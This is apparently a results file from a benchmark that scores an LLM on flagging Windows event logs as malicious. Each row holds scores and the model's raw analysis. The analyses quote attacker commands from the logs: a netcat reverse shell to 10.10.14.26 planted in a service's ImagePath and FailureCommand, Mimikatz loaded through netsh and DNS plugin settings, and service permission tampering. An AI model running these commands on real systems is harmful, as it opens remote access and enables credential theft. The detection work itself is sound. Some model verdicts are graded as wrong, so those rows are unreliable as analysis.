# DETECTION BENCHMARK RESULTS - column glossary
# ----------------------------------------------------------------------
# Model               LLM model id used to score this run
# Filename            Source artifact analyzed (EVTX file or CSV stem)
# Difficulty          Tag from metadata.json: easy / medium / hard
# Test Set            A=Known Pattern, B=Obfuscated, C=Noise-heavy, D=Benign
# Status              processed | error | context_exceeded
# Malicious           Model verdict: YES (attack) or NO (routine/benign)
# Confidence %        Heuristic confidence from response structure quality, not model-stated (0-100)
# Alignment %         Share of cited evidence found verbatim in source (0-100)
# Structure Valid     Response parsed cleanly into the required sections
# Event IDs           Event IDs extracted from the model's EVIDENCE block
# Processes           Process names extracted from the model's EVIDENCE block
# Accounts            Account names extracted from the model's EVIDENCE block
# Commands            Command lines / script blocks extracted from EVIDENCE
# Network             IPs / hostnames / shares extracted from EVIDENCE
# Registry            Registry keys / values extracted from EVIDENCE
# Hallucination %     Share of cited evidence not found in source events (0-100)
# Response Time (s)   Wall-clock seconds from prompt sent to response received
# Extraction (6)      Did the model find the right evidence? (0-6)
# Interpretation (6)  Did it correctly explain what the evidence implies? (0-6)
# NoHallucination (4) 4 = no fabricated evidence, 0 = heavy fabrication
# Reasoning (4)       Quality of the chain of reasoning in EXPLANATION (0-4)
# Total (20)          Sum of the four criteria above (0-20)
# Grade               Letter grade from Total: A>=17, B>=14, C>=10, D<10
# LLM Response        Full raw text the model returned, before any parsing
#
# Skip these lines in pandas:  pd.read_csv(path, comment='#')
# ----------------------------------------------------------------------
Model,Filename,Difficulty,Test Set,Status,Malicious,Confidence %,Alignment %,Structure Valid,Event IDs,Processes,Accounts,Commands,Network,Registry,Hallucination %,Response Time (s),Extraction (6),Interpretation (6),NoHallucination (4),Reasoning (4),Total (20),Grade,LLM Response
claude-opus-4-8,ID4688-Service permissions modified (registry).evtx,easy,A,processed,YES,100.0,100.0,YES,4688,"C:\Windows\System32\reg.exe, C:\Windows\System32\dllhost.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\svchost.exe","admmig, WIN10-02$","reg  add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\XblGameSave\Security"" /v Security /t REG_BINARY /d fe340ead, C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}",,HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\XblGameSave\Security,0.0,6.20,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688, 4688
- Processes: C:\Windows\System32\reg.exe, C:\Windows\System32\dllhost.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\svchost.exe
- Accounts: admmig, WIN10-02$
- Commands: reg  add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\XblGameSave\Security"" /v Security /t REG_BINARY /d fe340ead, C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}
- Network: None
- Registry: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\XblGameSave\Security

EXPLANATION:
The account admmig uses cmd.exe to launch reg.exe modifying the Security descriptor of a service (XblGameSave) registry key, a technique used to alter service permissions for persistence or privilege escalation. This is immediately followed by a dllhost.exe spawned via svchost.exe with a COM Processid, consistent with a UAC bypass/elevation chain associated with the same logon session (0x5F72FEE). The combination of service security tampering and COM-based elevation indicates malicious activity rather than routine administration."
claude-opus-4-8,ID4688-Service permissions modified (sc).evtx,easy,A,processed,YES,100.0,100.0,YES,4688,"C:\Windows\System32\sc.exe, C:\Windows\System32\cmd.exe",admmig,"sc  sdset xboxgip ""D:(A | CCLCSWRPWPDTLOCRRC | SY)",,,0.0,4.01,6.0,5.0,4.0,2,17.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688
- Processes: C:\Windows\System32\sc.exe, C:\Windows\System32\cmd.exe
- Accounts: admmig
- Commands: sc  sdset xboxgip ""D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)
- Network: None
- Registry: None

EXPLANATION:
The command uses sc.exe sdset to modify the security descriptor of the xboxgip service, a technique used to alter service permissions/DACLs for persistence or to deny access (potentially blocking defenders or hiding tampering). Modifying a service's security descriptor via sdset is an unusual administrative action that aligns with service-based persistence or defense evasion rather than routine activity."
claude-opus-4-8,ID4697-New service for Mimikatz.evtx,easy,A,processed,YES,100.0,100.0,YES,"1102, 4697","mimidrv, C:\TOOLS\Security_tool\Mimikatz-fev-2020\mimidrv.sys",admmig,,,,0.0,3.87,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4697
- Processes: mimidrv, C:\TOOLS\Security_tool\Mimikatz-fev-2020\mimidrv.sys
- Accounts: admmig
- Commands: None
- Network: None
- Registry: None

EXPLANATION:
The security audit log was cleared (Event 1102) by account admmig, immediately followed by installation of the mimidrv kernel driver (mimidrv.sys), a known Mimikatz credential-theft component installed as a LocalSystem service. The log clearing is a defense-evasion technique paired with the Mimikatz driver installation, strongly indicating malicious credential-dumping and anti-forensic activity by the same actor on the same logon session (0xCC3C3)."
claude-opus-4-8,ID7045-4697-SMBexec service registration.evtx,easy,A,processed,YES,100.0,87.5,YES,"7045, 4697","%COMSPEC%, execute.bat","LocalSystem, admmig",%COMSPEC% /Q /c echo cd  ^> \\127.0.0.1\C$\__output 2^>^&1 > %TEMP%\execute.bat & %COMSPEC% /Q /c %TEMP%\execute.bat & del %TEMP%\execute.bat,127.0.0.1,,0.0,5.88,5.2,5.0,4.0,3,17.2,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 7045, 4697
- Processes: %COMSPEC%, execute.bat
- Accounts: LocalSystem, admmig
- Commands: %COMSPEC% /Q /c echo cd  ^> \\127.0.0.1\C$\__output 2^>^&1 > %TEMP%\execute.bat & %COMSPEC% /Q /c %TEMP%\execute.bat & del %TEMP%\execute.bat
- Network: 127.0.0.1
- Registry: None

EXPLANATION:
A new service named BTOBTO was installed running as LocalSystem with an ImagePath that executes commands via cmd.exe, redirects output to a remote admin share (\\127.0.0.1\C$\__output), and deletes its own batch file afterward — a hallmark of PsExec/Impacket-style remote command execution. The cleanup behavior, redirection to C$ share, and use of a randomly-named temporary service strongly indicate lateral movement and remote code execution rather than a legitimate service install."
claude-opus-4-8,ID7045-7036 PSexec service installation.evtx,easy,A,processed,YES,100.0,83.3,YES,"104, 7045, 7036",PSEXESVC.exe,admmig,,,,0.0,3.72,5.0,6.0,4.0,4,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 104, 7045, 7036
- Processes: PSEXESVC.exe
- Accounts: admmig
- Commands: None
- Network: None
- Registry: None

EXPLANATION:
The System event log was cleared by account admmig (Event ID 104), immediately followed by installation and execution of the PSEXESVC service (Event ID 7045) running as LocalSystem, which is a hallmark of PsExec-based remote execution. The combination of log clearing to destroy evidence followed within seconds by a remote-execution service install/start/stop cycle strongly indicates lateral movement and anti-forensic attacker activity rather than routine administration."
claude-opus-4-8,ID7045-New service for Mimikatz +npcap.evtx,easy,A,processed,YES,100.0,81.8,YES,7045,"test.exe, OfficeClickToRun.exe, MicrosoftSearchInBing.exe, npcap.sys, mimidrv.sys",LocalSystem,,,,0.0,4.62,4.9,6.0,4.0,3,17.9,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 7045
- Processes: test.exe, OfficeClickToRun.exe, MicrosoftSearchInBing.exe, npcap.sys, mimidrv.sys
- Accounts: LocalSystem
- Commands: None
- Network: None
- Registry: None

EXPLANATION:
The installation of the ""mimikatz driver (mimidrv)"" kernel mode driver from C:\TOOLS\Security_tool\Mimikatz-fev-2020\mimidrv.sys is a clear indicator of credential-dumping tooling being deployed on the host. The presence of Npcap packet capture driver and a suspicious ""WCESERVICE"" service pointing to D:\Service\test.exe further support malicious credential-theft and reconnaissance activity on jump01.offsec.lan."
claude-opus-4-8,ID7045-Random service installation.evtx,easy,A,processed,YES,100.0,83.3,YES,"104, 7045",virusé.exe,"admmig, LocalSystem",,,,0.0,3.50,5.0,6.0,4.0,4,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 104, 7045
- Processes: virusé.exe
- Accounts: admmig, LocalSystem
- Commands: None
- Network: None
- Registry: None

EXPLANATION:
The System event log was cleared (Event ID 104) by user admmig, immediately followed by installation of a new service (Event ID 7045) named ""bad-task"" running the suspicious binary ""virusé.exe"" as LocalSystem. Clearing logs to hide activity followed seconds later by a demand-start service installation under SYSTEM privileges is a classic attacker persistence and anti-forensics pattern."
claude-opus-4-8,ID800-4103-4104-Service abuse with Failure Command.evtx,easy,A,processed,YES,100.0,50.0,YES,"800, 4103, 4104","powershell.exe, C:\nc.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",OFFSEC\admmig,"Set-ItemProperty -path HKLM:\System\CurrentControlSet\services\xboxgip -name FailureCommand -value ""C:\nc.exe -e powershell.exe 10.10.14.26 4447"", Microsoft.PowerShell.Core\Set-StrictMode -Off",10.10.14.26 4447,HKLM:\System\CurrentControlSet\services\xboxgip,0.0,6.07,3.0,6.0,4.0,4,17.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 800, 4103, 4104
- Processes: powershell.exe, C:\nc.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
- Accounts: OFFSEC\admmig
- Commands: Set-ItemProperty -path HKLM:\System\CurrentControlSet\services\xboxgip -name FailureCommand -value ""C:\nc.exe -e powershell.exe 10.10.14.26 4447"", Microsoft.PowerShell.Core\Set-StrictMode -Off
- Network: 10.10.14.26 4447
- Registry: HKLM:\System\CurrentControlSet\services\xboxgip

EXPLANATION:
The user OFFSEC\admmig used Set-ItemProperty to modify the xboxgip service's FailureCommand registry value to execute netcat (nc.exe) spawning a reverse PowerShell shell to 10.10.14.26 on port 4447. This is a clear service-based persistence and reverse-shell technique, abusing the recovery/failure command to establish a callback to an attacker-controlled host. The combination of registry modification, netcat with -e powershell.exe, and an external listener is unambiguous malicious behavior."
claude-opus-4-8,ID800-4103-4104-Service abuse with malicious path.evtx,easy,A,processed,YES,100.0,50.0,YES,"800, 4103, 4104","powershell.exe, nc.exe",OFFSEC\admmig,"Set-ItemProperty -path HKLM:\System\CurrentControlSet\services\xboxgip -name ImagePath -value ""C:\nc.exe -e powershell.exe 10.10.14.26 4447""",10.10.14.26 4447,HKLM:\System\CurrentControlSet\services\xboxgip,0.0,5.41,3.0,6.0,4.0,4,17.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 800, 4103, 4104
- Processes: powershell.exe, nc.exe
- Accounts: OFFSEC\admmig
- Commands: Set-ItemProperty -path HKLM:\System\CurrentControlSet\services\xboxgip -name ImagePath -value ""C:\nc.exe -e powershell.exe 10.10.14.26 4447""
- Network: 10.10.14.26 4447
- Registry: HKLM:\System\CurrentControlSet\services\xboxgip

EXPLANATION:
The user OFFSEC\admmig modified the ImagePath of the xboxgip service to launch nc.exe (netcat) with the ""-e powershell.exe"" flag, creating a reverse shell to 10.10.14.26 on port 4447. This is a classic service-hijack persistence and command-and-control technique abusing an existing service to execute a malicious binary. The use of netcat to pipe PowerShell to an external attacker-controlled IP confirms malicious intent."
claude-opus-4-8,ID800-4103-4104-Service creation (PowerShell).evtx,easy,B,processed,YES,100.0,62.5,YES,"800, 4104, 4103","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, virus.exe",OFFSEC\admmig,"New-Service -Name ""hackervirus"" -BinaryPathName '""virus.exe""'",,,0.0,4.66,3.8,6.0,4.0,4,17.8,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 800, 4104, 4103
- Processes: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, virus.exe
- Accounts: OFFSEC\admmig
- Commands: New-Service -Name ""hackervirus"" -BinaryPathName '""virus.exe""'
- Network: None
- Registry: None

EXPLANATION:
The user OFFSEC\admmig used PowerShell to create a new Windows service named ""hackervirus"" pointing to a binary ""virus.exe"", which is a classic persistence/execution technique using suspicious naming. Service creation via PowerShell to run an unsigned/arbitrary executable is consistent with malicious persistence behavior, and the explicit ""hackervirus""/""virus.exe"" identifiers further indicate intent."
claude-opus-4-8,ID13-WMIimplant registry crash control.evtx,easy,A,processed,YES,100.0,71.7,YES,13,"C:\Windows\system32\services.exe, C:\Windows\system32\wbem\wmiprvse.exe",,,"10.23.42.38, 10.23.42.1, 10.23.42.10, 10.23.42.11","HKLM\System\CurrentControlSet\Services\hacker23\Start, HKLM\System\CurrentControlSet\Services\hacker23\ImagePath, HKLM\System\CurrentControlSet\Control\CrashControl\DumpFile",66.7,6.37,4.3,6.0,1.3,4,15.6,B,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 13
- Processes: C:\Windows\system32\services.exe, C:\Windows\system32\wbem\wmiprvse.exe
- Accounts: None
- Commands: None
- Network: 10.23.42.38, 10.23.42.1, 10.23.42.10, 10.23.42.11
- Registry: HKLM\System\CurrentControlSet\Services\hacker23\Start, HKLM\System\CurrentControlSet\Services\hacker23\ImagePath, HKLM\System\CurrentControlSet\Control\CrashControl\DumpFile

EXPLANATION:
A suspicious service named ""hacker23"" was created via services.exe with an auto-start value, indicating persistence. WMI (wmiprvse.exe, T1047) was then used to manipulate CrashControl registry keys, and the DumpFile value was abused to store ipconfig output (decoded from the byte array revealing host fs03vuln, IP 10.23.42.38, gateway/DNS servers), a covert data-staging/command-output exfiltration technique. The combination of a hacker-named service plus remote WMI registry abuse to embed reconnaissance output is clearly malicious."
claude-opus-4-8,ID19-20-WMI registration via PowerLurk.evtx,easy,A,processed,YES,100.0,100.0,YES,"20, 19","cmd.exe, notepad.exe",OFFSEC\admmig,"""cmd.exe /c echo %ProcessId% >> c:\\\\temp\\\\log.txt""",,,0.0,3.97,6.0,5.0,4.0,2,17.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 20, 19
- Processes: cmd.exe, notepad.exe
- Accounts: OFFSEC\admmig
- Commands: ""cmd.exe /c echo %ProcessId% >> c:\\\\temp\\\\log.txt""
- Network: None
- Registry: None

EXPLANATION:
The logs show creation of a WMI Event Consumer (EventID 20) paired with a WMI Event Filter (EventID 19), both named ""Evil"", forming a WMI persistence mechanism (T1047). The filter triggers on notepad.exe process starts and the consumer executes a command-line payload, which is a classic fileless persistence/triggered-execution technique rather than routine administration."
claude-opus-4-8,ID4688-netsh helper DLL.evtx,easy,A,processed,YES,100.0,100.0,YES,"1102, 4688","netsh.exe, cmd.exe, mimikatz.exe",admmig,netsh  add helper  mimikatz.exe,,,0.0,3.45,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4688
- Processes: netsh.exe, cmd.exe, mimikatz.exe
- Accounts: admmig
- Commands: netsh  add helper  mimikatz.exe
- Network: None
- Registry: None

EXPLANATION:
The account admmig cleared the Security audit log (Event 1102) and seconds later launched netsh to load mimikatz.exe as a helper DLL (Event 4688), a known credential-theft and persistence technique. The combination of log clearing to cover tracks followed by mimikatz execution strongly indicates malicious post-exploitation activity rather than routine administration."
claude-opus-4-8,ID5136-AdminSDholder backdoor obfuscation (via localizationDisplayId).evtx,easy,B,processed,NO,100.0,50.0,YES,5136,,admmig,,"rootdc1.offsec.lan, offsec.lan",,0.0,37.24,3.0,2.0,4.0,4,13.0,C,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 5136
- Processes: None
- Accounts: admmig
- Commands: None
- Network: rootdc1.offsec.lan, offsec.lan
- Registry: None

EXPLANATION:
These are AD directory service object modification events (5136) showing paired value-added/value-deleted operations on the localizationDisplayId attribute of the User-Force-Change-Password extended-right configuration object. The changes are simple localization display ID value swaps (2 and 3) performed by an administrative account (admmig) and do not modify permissions or grant rights, consistent with routine configuration/localization updates rather than a privilege-escalation chain."
claude-opus-4-8,ID5136-AdminSDholder permissions changed.evtx,easy,A,processed,YES,100.0,50.0,YES,5136,,admmig,,,,0.0,5.95,3.0,6.0,4.0,4,17.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 5136
- Processes: None
- Accounts: admmig
- Commands: None
- Network: None
- Registry: None

EXPLANATION:
Two paired 5136 events show modification of the nTSecurityDescriptor on CN=AdminSDHolder,CN=System,DC=offsec,DC=lan, with the new ACL adding a full-control ACE (CCDCLCSWRPWPDTLOCRSDRCWDWO) for a non-default principal (SID ...-1234) that was absent in the prior value. The AdminSDHolder object controls permissions on all protected/privileged accounts via SDProp propagation, so adding full control here is a classic persistence/privilege-escalation backdoor technique. The change being performed by a single actor (admmig) on this highly sensitive container is a strong attack signal."
claude-opus-4-8,ID12-LSA Protect mode enabled RunAsPPL.evtx,easy,D,processed,NO,100.0,100.0,YES,"14, 12",,,,,,0.0,3.36,6.0,5.0,4.0,3,18.0,A,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 14, 12
- Processes: None
- Accounts: None
- Commands: None
- Network: None
- Registry: None

EXPLANATION:
These are standard Microsoft-Windows-Wininit system events related to boot configuration and initialization, which occur during normal Windows startup. There is no evidence of suspicious processes, privilege escalation, network activity, or account manipulation. This is routine, benign system activity."
claude-opus-4-8,ID4664-symbolic link created.evtx,easy,A,processed,NO,100.0,100.0,YES,4664,,Admin,,,,0.0,2.93,6.0,5.0,4.0,3,18.0,A,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 4664
- Processes: None
- Accounts: Admin
- Commands: None
- Network: None
- Registry: None

EXPLANATION:
Event ID 4664 records the creation of a hard link, here linking a Sysmon configuration file within the user's own Downloads directory. This is routine file management activity by a local Admin account with no indicators of privilege escalation, suspicious commands, or network connections."
claude-opus-4-8,ID150-Failed DLL loaded by DNS server.evtx,easy,A,processed,YES,100.0,100.0,YES,150,mimilib.dll,,,rootdc1.offsec.lan,,0.0,4.25,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 150
- Processes: mimilib.dll
- Accounts: None
- Commands: None
- Network: rootdc1.offsec.lan
- Registry: None

EXPLANATION:
DNS Server Event ID 150 indicates the service failed to load or encountered an issue with a server-level plugin DLL (.\mimilib.dll), which is a known Mimikatz component used to abuse the DNS ServerLevelPluginDll feature for code execution and persistence on a domain controller. The presence of mimilib.dll on a DNS server (rootdc1.offsec.lan) is a strong indicator of attacker activity rather than legitimate use."
claude-opus-4-8,ID4688-DNS DLL serverlevelplugindll command.evtx,easy,A,processed,YES,100.0,100.0,YES,4688,"dnscmd.exe, cmd.exe, mimilib.dll",admmig,"dnscmd.exe  /config /serverlevelplugindll ""C:\TOOLS\Mimikatz-fev-2020\mimilib.dll""",,,0.0,4.26,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688
- Processes: dnscmd.exe, cmd.exe, mimilib.dll
- Accounts: admmig
- Commands: dnscmd.exe  /config /serverlevelplugindll ""C:\TOOLS\Mimikatz-fev-2020\mimilib.dll""
- Network: None
- Registry: None

EXPLANATION:
The dnscmd.exe command registers a custom server-level plugin DLL (mimilib.dll from a Mimikatz toolset directory) into the DNS service, a known persistence and code-execution technique that loads attacker DLLs with SYSTEM privileges on a domain controller (rootdc1.offsec.lan). The reference to a Mimikatz tools folder and the elevated token strongly indicate malicious privilege/persistence activity rather than routine administration."
